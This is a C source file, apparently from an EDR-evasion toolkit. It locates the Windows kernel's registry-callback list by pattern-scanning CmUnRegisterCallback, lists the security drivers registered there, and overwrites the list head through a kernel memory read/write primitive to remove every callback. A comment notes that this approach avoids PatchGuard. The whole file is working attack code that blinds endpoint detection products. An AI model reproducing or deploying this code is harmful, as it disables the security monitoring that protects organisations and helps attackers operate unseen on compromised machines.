#include "Common.h"
#include "Structs.h"

#include "RemoveCallBacks.h"

#include "stdio.h"

#define CM_CALLBACK_FUNCTION_OFFSET    0x28

VOID ClearCmRegistercallback() {

	UINT64 offset = 0;

	// Get CmUnRegisterCallback function address
	// INT64 CmUnRegisterCallbackAddr = GetFuncAddress((CHAR*)"ntoskrnl.exe", (CHAR*)"CmUnRegisterCallback");
	INT64 CmUnRegisterCallbackAddr = GetFuncAddressH(NTOSKRNLEXE_CH, CmUnRegisterCallback_CH);
	if (CmUnRegisterCallbackAddr == 0) return;

	UINT64 patternAddr = FindPattern(CmUnRegisterCallbackAddr, &PREDEFINED_PATTERNS[5], 300);
	if (!patternAddr) {
		PRINT("Failed to locate CmUnRegisterCallback pattern\n");
		return;
	}

	PRINT("----------------------------------------------------\n");
	PRINT("Register the CmRegisterCallback callback driver: \n----------------------------------------------------\n\n[Clear all below]\n");

	// Calculate instruction offset
	offset = CalculateOffset(patternAddr, 2, 6);

	// Get callback list head pointer
	INT64 CallbackListHead = patternAddr + offset + 7;

	// Read list head pointers
	INT64 Flink = 0;
	DriverMemoryOperation((VOID*)CallbackListHead, &Flink, 8, MEMORY_WRITE);
	INT64 Blink = 0;
	DriverMemoryOperation((VOID*)(CallbackListHead + 8), &Blink, 8, MEMORY_WRITE);

	// This is actually just to output what drivers have registered with the Register callback function. 
	// In practical situations, this loop function can be commented out [43-69]
	// Count callback nodes
	INT Count = 1;
	INT64 tFlink = Flink;
	do {
		Count++;
		INT64 temp = 0;
		DriverMemoryOperation((VOID*)(tFlink), &temp, 8, MEMORY_WRITE);
		tFlink = temp;
	} while (tFlink != Blink);

	// Due to the PatchGuard protection of this kernel memory location, it cannot be replaced by passing an empty array. 
	// Only the header of the doubly linked list can be modified to bypass PatchGuard.
	for (INT i = 0; i < Count; i++) {
		// Read callback function
		INT64 EDRFunction = 0;
		DriverMemoryOperation((VOID*)(Flink + CM_CALLBACK_FUNCTION_OFFSET), &EDRFunction, 8, MEMORY_WRITE);

		// Get driver name and check EDR status
		CHAR* DriverName = GetDriverName(EDRFunction);
		if (DriverName != NULL) {
			PRINT("%s\n", DriverName);
		}

		// Move to next node
		INT64 temp = 0;
		DriverMemoryOperation((VOID*)(Flink), &temp, 8, MEMORY_WRITE);
		Flink = temp;
	}

	// Clear callback list head
	DriverMemoryOperation(&CallbackListHead, (VOID*)CallbackListHead, 8, MEMORY_WRITE);
}